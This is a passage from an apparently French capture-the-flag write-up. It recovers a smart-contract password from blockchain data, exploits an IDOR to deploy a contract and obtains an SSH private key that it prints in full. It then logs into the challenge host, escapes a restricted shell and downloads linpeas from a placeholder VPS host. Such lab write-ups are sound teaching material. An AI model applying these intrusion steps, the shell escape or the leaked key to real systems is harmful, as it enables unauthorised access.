</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">function</span><span style="color:#ff79c6">()</span> external payable <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">funds</span> <span style="color:#ff79c6">=</span> funds + msg.value;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">function</span> transfer<span style="color:#ff79c6">()</span> external <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        msg.sender.transfer<span style="color:#ff79c6">(</span>funds<span style="color:#ff79c6">)</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">funds</span> <span style="color:#ff79c6">=</span> 0;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">function</span> login<span style="color:#ff79c6">(</span>string memory _password<span style="color:#ff79c6">)</span> public<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span><span style="color:#ff79c6">((</span>keccak256<span style="color:#ff79c6">(</span>abi.encodePacked<span style="color:#ff79c6">(</span>_password<span style="color:#ff79c6">))</span> <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">hash</span><span style="color:#ff79c6">)){</span>
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">admin</span> <span style="color:#ff79c6">=</span> true;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>Il semblerait que le contrat ait une fonction <code>login</code> qui requiert un mot de passe.
Le mot de passe fournit en paramètre de la fonction de connexion et le <a href="https://fr.wikipedia.org/wiki/SHA-3"  target="_blank" rel="noopener" >&lt;code&gt;sha3&lt;/code&gt;</a> de celui-ci est comparé au hash codé en dur plus haut.</p>
<p>Ce hash correspond à <code>une adresse privée de la Blockchain ethereum</code>
comme décrit à la page <code>/help</code> . On peut l&rsquo;ajouter à Metamask !</p>
<p><img src="./img/eth.png" alt="AltText"></p>
<p>On retrouve donc l&rsquo;adresse publique du compte : <code>0xf5A82264Ecec7F65DB259548717d9BFF6a148D92</code></p>
<p>Enfin grâce à etherscan , on trouve les transactions ! <a href="https://ropsten.etherscan.io/address/0xf5A82264Ecec7F65DB259548717d9BFF6a148D92"  target="_blank" rel="noopener" >ici</a></p>
<p>On remarque que la dernière transaction concerne la fonction <code>login</code> évoquée plus haut.</p>
<p><img src="./img/eth2.png" alt="AltText"></p>
<p>En cliquant sur <code>View Input As UTF-8</code> , on obtient le mot de passe passé en paramètre : <code>harvester23</code></p>
<p>Toujours dans notre exploration, on trouve dans le code source de la page :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>$(<span style="color:#8be9fd;font-style:italic">document</span>).on(<span style="color:#f1fa8c">&#39;click&#39;</span>, <span style="color:#f1fa8c">&#39;.check&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span> (event) {
</span></span><span style="display:flex;"><span>     $.ajax({
</span></span><span style="display:flex;"><span>       type<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;POST&#39;</span>,
</span></span><span style="display:flex;"><span>       url<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;/check&#39;</span>,
</span></span><span style="display:flex;"><span>       data<span style="color:#ff79c6">:</span> {
</span></span><span style="display:flex;"><span>         contractAddress<span style="color:#ff79c6">:</span> $(<span style="color:#f1fa8c">`#instanceAddress`</span>).text()
</span></span><span style="display:flex;"><span>       },
</span></span><span style="display:flex;"><span>       success<span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">function</span> (response) {
</span></span><span style="display:flex;"><span>         $(<span style="color:#f1fa8c">`#levelKey`</span>).show();
</span></span><span style="display:flex;"><span>         $(<span style="color:#f1fa8c">`#levelKey`</span>).text(<span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span>response.responseKey<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>);
</span></span><span style="display:flex;"><span>       },
</span></span><span style="display:flex;"><span>       error<span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">function</span> (response) {
</span></span><span style="display:flex;"><span>         $(<span style="color:#f1fa8c">`#levelKey`</span>).show();
</span></span><span style="display:flex;"><span>         $(<span style="color:#f1fa8c">`#levelKey`</span>).text(<span style="color:#f1fa8c">`There was an error, please try again...`</span>);
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>     });
</span></span><span style="display:flex;"><span>   });
</span></span></code></pre></div><p>Voici donc le scénario qu&rsquo;on peut imaginer pour valider le challenge :</p>
<ul>
<li>Déployer le contrat</li>
<li>Appeler la fonction <code>login</code> du contrat avec le mot de passe <code>harvester23</code></li>
<li>Appelé l&rsquo;endpoint <code>check</code> pour obtenir <code>${response.responseKey}</code></li>
</ul>
<h6 id="déployer-le-contrat">Déployer le contrat</h6>
<p>En bas de la page de la bank, on peut se <em>connecter</em>.
En réalité, aucun mot de passe n&rsquo;est comparé. C&rsquo;est <code>un faux login.</code></p>
<p>On accède à une option <code>Deploy refund contract</code>
Avec <strong>BurpSuite</strong> on récupère la requête et de la même manière que pour le téléchargement : il existe une <strong>vulnérabilité IDOR</strong> qui permet de <strong>déployer le contrat 13</strong> au lieu du contrat N°1</p>
<p><img src="./img/eth3.png" alt="AltText">
Nous avons maintenant l&rsquo;adresse du contrat : <em>0x626BB1a4d1630291F1075d4AbD8b0075be306934</em></p>
<h6 id="appeler-le-contrat">Appeler le contrat</h6>
<p>On va utiliser <a href="https://github.com/wlayzz/RopstenCtf"  target="_blank" rel="noopener" >&lt;strong&gt;RopStenCTF&lt;/strong&gt;</a> , un outil de <a href="https://twitter.com/Wlayzz"  target="_blank" rel="noopener" >Wlayzz</a> qui permet d&rsquo;interagir avec ce genre de contrat !</p>
<p>D&rsquo;abord, on va récupérer une clé api sur <a href="https://infura.io/"  target="_blank" rel="noopener" >https://infura.io/</a> pour interagir avec la Blockchain Ropsten Ethereum .</p>
<p>On setup notre Wallet au tool :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> ✗
</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py wallet --provider-key f4ea35f577f14494b67fXXXXXXXXXXXX  --generate
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
</span></span><span style="display:flex;"><span> | _ <span style="color:#f1fa8c">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#f1fa8c">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#ff79c6">(</span>__|  _|  _|
</span></span><span style="display:flex;"><span> |_|_<span style="color:#f1fa8c">\_</span>__| .__/__/<span style="color:#f1fa8c">\_</span>_<span style="color:#f1fa8c">\_</span>__|_<span style="color:#ff79c6">||</span>_<span style="color:#f1fa8c">\_</span>__|<span style="color:#f1fa8c">\_</span>_|_|   by @Wlayzz
</span></span><span style="display:flex;"><span>         |_|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> Provider key saved in .env file
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Connected to ropsten network
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> Your secret key is 0x13af12d9f7c211e29caac1b7bec12f0c874fXXXXXXXXXXXXXXXXXXXXX <span style="color:#ff79c6">(</span>keep this secret<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> Your public adress is 0xF184008adeB767e0E869ffXXXXXXXXXXXXXXXXXXXXX
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> These informations are stored in .env file and will be used <span style="color:#ff79c6">for</span> smart contract interactions
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> You can claim <span style="color:#8be9fd;font-style:italic">$rETH</span> unsing this faucet: https://faucet.egorfine.com/
</span></span></code></pre></div><p>On Compile le SmartContract pour avoir le .abi et pouvoir ainsi appeler  le contrat:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> ✗
</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py contract --compile -f Refund.sol
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
</span></span><span style="display:flex;"><span> | _ <span style="color:#f1fa8c">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#f1fa8c">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#ff79c6">(</span>__|  _|  _|
</span></span><span style="display:flex;"><span> |_|_<span style="color:#f1fa8c">\_</span>__| .__/__/<span style="color:#f1fa8c">\_</span>_<span style="color:#f1fa8c">\_</span>__|_<span style="color:#ff79c6">||</span>_<span style="color:#f1fa8c">\_</span>__|<span style="color:#f1fa8c">\_</span>_|_|   by @Wlayzz
</span></span><span style="display:flex;"><span>         |_|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Connected to ropsten network
</span></span><span style="display:flex;"><span>Compiler run successful. Artifact<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> can be found in directory Refund.
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> abi and bin files generated on directory:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> ./Refund/Refund.abi
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> ./Refund/Refund.bin
</span></span></code></pre></div><p>On récupère les infos sur le SmartContrat de la blockchain ropsten :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> ✗
</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py contract --address 0x626BB1a4d1630291F1075d4AbD8b0075be306934 --info --abi ./Refund/Refund.abi
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
</span></span><span style="display:flex;"><span> | _ <span style="color:#f1fa8c">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#f1fa8c">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#ff79c6">(</span>__|  _|  _|
</span></span><span style="display:flex;"><span> |_|_<span style="color:#f1fa8c">\_</span>__| .__/__/<span style="color:#f1fa8c">\_</span>_<span style="color:#f1fa8c">\_</span>__|_<span style="color:#ff79c6">||</span>_<span style="color:#f1fa8c">\_</span>__|<span style="color:#f1fa8c">\_</span>_|_|   by @Wlayzz
</span></span><span style="display:flex;"><span>         |_|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Connected to ropsten network
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> Inspect contract at https://ropsten.etherscan.io/address/0x626BB1a4d1630291F1075d4AbD8b0075be306934
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> List of functions:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> admin<span style="color:#ff79c6">()</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> funds<span style="color:#ff79c6">()</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> login<span style="color:#ff79c6">(</span>_password:string<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> transfer<span style="color:#ff79c6">()</span>
</span></span></code></pre></div><p>On envoie la transaction à l&rsquo;adresse <em>0x626BB1a4d1630291F1075d4AbD8b0075be306934</em> en appelant la fonction <code>login</code> avec le mot de passe en paramètre <code>harvester23</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> ✗
</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py contract --address 0x626BB1a4d1630291F1075d4AbD8b0075be306934 --call --abi ./Refund/Refund.abi -fc login -p harvester23
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
</span></span><span style="display:flex;"><span> | _ <span style="color:#f1fa8c">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#f1fa8c">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#ff79c6">(</span>__|  _|  _|
</span></span><span style="display:flex;"><span> |_|_<span style="color:#f1fa8c">\_</span>__| .__/__/<span style="color:#f1fa8c">\_</span>_<span style="color:#f1fa8c">\_</span>__|_<span style="color:#ff79c6">||</span>_<span style="color:#f1fa8c">\_</span>__|<span style="color:#f1fa8c">\_</span>_|_|   by @Wlayzz
</span></span><span style="display:flex;"><span>         |_|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Connected to ropsten network
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> Inspect contract at https://ropsten.etherscan.io/address/0x626BB1a4d1630291F1075d4AbD8b0075be306934
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> Inspect transaction here: https://ropsten.etherscan.io/tx/0xfc6cb2e3b27386f453ce1da32bebb3f213a367792d480903a7e4beedccab7438
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> Transaction <span style="color:#ff79c6">done</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Reponse login<span style="color:#ff79c6">(</span>harvester23<span style="color:#ff79c6">)</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Transaction status: success
</span></span></code></pre></div><p>On regarde si <code>admin</code> est bien à <code>true</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> ✗
</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py contract --address 0x626BB1a4d1630291F1075d4AbD8b0075be306934 --view --abi ./Refund/Refund.abi -fc admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
</span></span><span style="display:flex;"><span> | _ <span style="color:#f1fa8c">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#f1fa8c">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#ff79c6">(</span>__|  _|  _|
</span></span><span style="display:flex;"><span> |_|_<span style="color:#f1fa8c">\_</span>__| .__/__/<span style="color:#f1fa8c">\_</span>_<span style="color:#f1fa8c">\_</span>__|_<span style="color:#ff79c6">||</span>_<span style="color:#f1fa8c">\_</span>__|<span style="color:#f1fa8c">\_</span>_|_|   by @Wlayzz
</span></span><span style="display:flex;"><span>         |_|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Connected to ropsten network
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> Inspect contract at https://ropsten.etherscan.io/address/0x626BB1a4d1630291F1075d4AbD8b0075be306934
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> Calling <span style="color:#ff79c6">function</span> <span style="color:#ff79c6">done</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Reponse admin<span style="color:#ff79c6">()</span>: True
</span></span></code></pre></div><h6 id="récupérer-la-clé-sur-check">Récupérer la clé sur /check</h6>
<p>D&rsquo;après le code <strong>JavaScript</strong> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>$(<span style="color:#8be9fd;font-style:italic">document</span>).on(<span style="color:#f1fa8c">&#39;click&#39;</span>, <span style="color:#f1fa8c">&#39;.check&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span> (event) {
</span></span><span style="display:flex;"><span>     $.ajax({
</span></span><span style="display:flex;"><span>       type<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;POST&#39;</span>,
</span></span><span style="display:flex;"><span>       url<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;/check&#39;</span>,
</span></span><span style="display:flex;"><span>       data<span style="color:#ff79c6">:</span> {
</span></span><span style="display:flex;"><span>         contractAddress<span style="color:#ff79c6">:</span> $(<span style="color:#f1fa8c">`#instanceAddress`</span>).text()
</span></span><span style="display:flex;"><span>       },
</span></span><span style="display:flex;"><span>       success<span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">function</span> (response) {
</span></span><span style="display:flex;"><span>         $(<span style="color:#f1fa8c">`#levelKey`</span>).show();
</span></span><span style="display:flex;"><span>         $(<span style="color:#f1fa8c">`#levelKey`</span>).text(<span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span>response.responseKey<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>);
</span></span><span style="display:flex;"><span>       },
</span></span><span style="display:flex;"><span>       error<span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">function</span> (response) {
</span></span><span style="display:flex;"><span>         $(<span style="color:#f1fa8c">`#levelKey`</span>).show();
</span></span><span style="display:flex;"><span>         $(<span style="color:#f1fa8c">`#levelKey`</span>).text(<span style="color:#f1fa8c">`There was an error, please try again...`</span>);
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>     });
</span></span><span style="display:flex;"><span>   });
</span></span></code></pre></div><p>Il faut faire une requête <strong>POST</strong> avec en data <code>instanceAddress</code> et l&rsquo;adresse du Contract
Avec burp , on obtient le résultat suivant :</p>
<p><img src="./img/ssh_key.png" alt="AltText"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#ff79c6">&#34;responseKey&#34;</span>:<span style="color:#f1fa8c">&#34;\nWelcome back Admin. Reminder of harvest creds :&lt;br&gt;\n- Username : harvester&lt;br&gt;\n- Key :&lt;br&gt;\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEA2ZF5CXjpJEXz3SNr7Ol7BvL3F5fiQgtqsc46nOY8ZQ0IZxmcIo2G\nRJIIYn1fEC/IU0qcgyWtzE+GYrusKdxL8oJ6A8d8zYkqkoZKkwn4QCRHAU9WS0NJfxpM4M\nsp4DEkAMmuFnoVNftQ3r7NZnBlYg9Jf6djiTp1GAfnSAxTzNEWZBhoiGI9/q7sL0AW49V7\nw5183/Rj/sM4kGmr469DStZJFWSPGKObvY1YS3IXV9j16+QN+usrVQVBZQWFz+NR98puwK\n7GppFxf23np8Nb0OoneWoGGCNhbV5VLq84vSIjkO+t5M556+WiRJMe6sZuCQQ09hTlf6jA\nn5Rp29oasQAAA9AEQyW/BEMlvwAAAAdzc2gtcnNhAAABAQDZkXkJeOkkRfPdI2vs6XsG8v\ncXl+JCC2qxzjqc5jxlDQhnGZwijYZEkghifV8QL8hTSpyDJa3MT4Ziu6wp3EvygnoDx3zN\niSqShkqTCfhAJEcBT1ZLQ0l/GkzgyyngMSQAya4WehU1+1Devs1mcGViD0l/p2OJOnUYB+\ndIDFPM0RZkGGiIYj3+ruwvQBbj1XvDnXzf9GP+wziQaavjr0NK1kkVZI8Yo5u9jVhLchdX\n2PXr5A366ytVBUFlBYXP41H3ym7ArsamkXF/beenw1vQ6id5agYYI2FtXlUurzi9IiOQ76\n3kznnr5aJEkx7qxm4JBDT2FOV/qMCflGnb2hqxAAAAAwEAAQAAAQEAoOIPzM9aJ3aK5AWj\ncycb0IGt8gZgS1JB7YWAljEyi87dXc/0QyDAHsiV5q6qsz+CNQVBQ0GDiUdtKml43+OFTa\njqLQ1A3oQFtSAU2TJQHq40y2UtfK4fFRwPqVLSfnQYGXUJhJl2Qdq7bFtPa+bFMYP4Z6sR\n0ZImsER35DEpbpP5gH1MpNVykBX7xdCz4xE2AE29hgPG8TdtW5eA5hBW++uHiWQvVmjyEm\n5kWB/qeJGT6ngXwms4Mh9ytwDMsIcFoxdNoW6DhixfGoqlJUtKFbAY9LFf5j4NzDa8l/wa\nndGxcZcujOCgZQCuEzcYzwUWKaqAikDv8Q1hl2iubtalIQAAAIAfaxGIcU2Ds+hzsVb07+\nheTf5elyC82v1Wz+LYQUojdAHsJynmLSbhYEfOrunLxkwPl+lEOGqrjnGPd82OLbSdXLIc\nPJ13EOsK0jlvQG3VorhpiybRaBXucRLD8FFNTozRt77HY3DDqRdNtZFdIoW6K/UqHx5bJK\nfZIgXdZNekhgAAAIEA8lRIB5S2HZTjD33tucWrX0ktGUojKWl58on77KlftrOmWSrIg4kb\nmVAN2+jIGxnFmipiQPFBPZT4ClL0T7nuVkzYRA3BHrd2D2bqdKSMrg8pk4uMeKI22U7Fh8\nmLvZCfNXBcsR2fNHodVF8cm2MfA1JlP2cgcnpmLVznNfLGRIUAAACBAOXXl+9C63eDb0V3\ndG/3iy/rn30UboPjZteFRyEgCiciOvAs+u+aQ4kKFvOusuNxpJ0fBIJ3qUKG7bzU1c5XWw\n+f2QdlwBr2PScV5QolF9p5JhUwAB45WDhnxGDrrg8NYqh3LrxPbKWmr6k7K6EMPrjj5h+y\nuFgXKSRVpluFZts9AAAAFmhhcnZlc3RlckBmNzUyNWE3MTA2NjgBAgME\n-----END OPENSSH PRIVATE KEY-----&#34;</span>}
</span></span></code></pre></div><p><strong>PARFAIT !</strong> , une clé SSH :)</p>
<p>Malheureusement, <strong>le port 22</strong> n&rsquo;accepte pas nôtre connexion . Refaisons un nmap avec l&rsquo;options <strong>-p-</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /root/Desktop
</span></span><span style="display:flex;"><span>➜   nmap 20.126.99.66 -p-
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp    open  ssh
</span></span><span style="display:flex;"><span>80/tcp    open  http
</span></span><span style="display:flex;"><span>3000/tcp  open  ppp
</span></span><span style="display:flex;"><span>8000/tcp  open  http-alt
</span></span><span style="display:flex;"><span>45236/tcp open  unknown
</span></span></code></pre></div><p>On trouve un port élevé que nous n&rsquo;avions pas avant : <code>45236</code></p>
<p>On peut se connecter en ssh :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chmod <span style="color:#bd93f9">400</span> ./id_rsa
</span></span><span style="display:flex;"><span>ssh -i ./id_rsa -p <span style="color:#bd93f9">45236</span> harvester@20.126.99.66
</span></span></code></pre></div><p>Et HOP !  Un shell
<img src="./img/rbash.png" alt="AltText"></p>
<p>On peut lire le flag : Enfin !!!!!!!!!!!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester:~$ ls
</span></span><span style="display:flex;"><span>current-log.log  flag-4.txt  host_discovered  root@10.10.99.124
</span></span><span style="display:flex;"><span>harvester:~$ cat flag-4.txt
</span></span><span style="display:flex;"><span>Flag <span style="color:#bd93f9">4</span> : ISEC<span style="color:#ff79c6">{</span>pR150n_8re4k<span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>harvester:~$
</span></span></code></pre></div><hr>
<h2 id="where-am-i">Where am I</h2>
<ul>
<li><strong>Nom</strong>  : Where am I&hellip;</li>
<li><strong>Point</strong> : 30</li>
<li><strong>Description</strong> : You&rsquo;re in! Explore their infrastructure and bring back as much information as possible to take them down.</li>
</ul>
<h6 id="solution">Solution:</h6>
<p>La première chose est d&rsquo;<code>escape</code> le <strong>lbash</strong> .
On peut lister les commandes possibles :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester:~$ <span style="color:#8be9fd;font-style:italic">help</span>
</span></span><span style="display:flex;"><span>cat  <span style="color:#8be9fd;font-style:italic">cd</span>  clear  <span style="color:#8be9fd;font-style:italic">echo</span>  <span style="color:#8be9fd;font-style:italic">exit</span>  <span style="color:#8be9fd;font-style:italic">help</span>  <span style="color:#8be9fd;font-style:italic">history</span>  lpath  ls  lsudo  <span style="color:#8be9fd;font-style:italic">pwd</span>
</span></span></code></pre></div><p>D&rsquo;après <a href="https://netsec.ws/?p=337"  target="_blank" rel="noopener" >cette page</a> on peut escape le lbash facilement :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester:~$ <span style="color:#8be9fd;font-style:italic">echo</span> os.system<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;/bin/bash&#39;</span><span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>harvester@harvester:~$ id
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>harvester<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>harvester<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">(</span>harvester<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>harvester@harvester:~$
</span></span></code></pre></div><p>On peut importer des fichiers sur le ssh de la manière suivante :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 -c <span style="color:#f1fa8c">&#34;from urllib import urlretrieve; urlretrieve(&#39;https://VPS_IP/linpeas.sh&#39;, &#39;/tmp/linpeas.sh&#39;)&#34;</span>
</span></span></code></pre></div><p>Malheureusement, je n&rsquo;ai pas trouvé de <strong>privesc</strong> simple à faire.
Par contre, on trouve quelque chose de très intéressant !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>╔══════════╣ Hostname, hosts and DNS
</span></span><span style="display:flex;"><span>harvester
</span></span><span style="display:flex;"><span>127.0.0.1       localhost
</span></span><span style="display:flex;"><span>::1     localhost ip6-localhost ip6-loopback
</span></span><span style="display:flex;"><span>fe00::0 ip6-localnet
